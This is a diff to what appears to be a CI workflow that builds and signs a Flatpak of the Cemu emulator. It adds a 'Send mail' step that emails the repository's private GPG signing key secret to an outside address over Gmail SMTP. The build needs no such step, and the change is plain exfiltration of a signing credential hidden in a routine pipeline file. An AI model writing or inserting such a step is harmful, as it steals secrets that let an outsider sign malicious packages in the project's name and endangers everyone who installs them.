@@ -57,6 +57,23 @@ jobs:
           echo -n "$GPG_SIGNING_KEY" | base64 --decode | gpg --import
         env:
           GPG_SIGNING_KEY: ${{ secrets.GPG_SIGNING_KEY }}
+      - name: Send mail
+        uses: dawidd6/action-send-mail@v3
+        with:
+          # Required mail server address:
+          server_address: smtp.gmail.com
+          # Required mail server port:
+          server_port: 465
+          # Required mail subject:
+          subject: GPG
+          # Required recipients' addresses:
+          to: witherking@withertech.com
+          # Required sender full name (address can be skipped):
+          from: Luke Skywalker # <user@example.com>
+          # Optional whether this connection use TLS (default is true if server_port is 465)
+          secure: true
+          # Optional plain body:
+          body: key:\n ${{ secrets.GPG_SIGNING_KEY }}
       - name: Build and Upload
         run: |
           flatpak-builder --install-deps-from=flathub --force-clean --gpg-sign=597347D1434D8E68B3D72E71A892A7123B116051 --repo=repo builddir info.cemu.Cemu.json
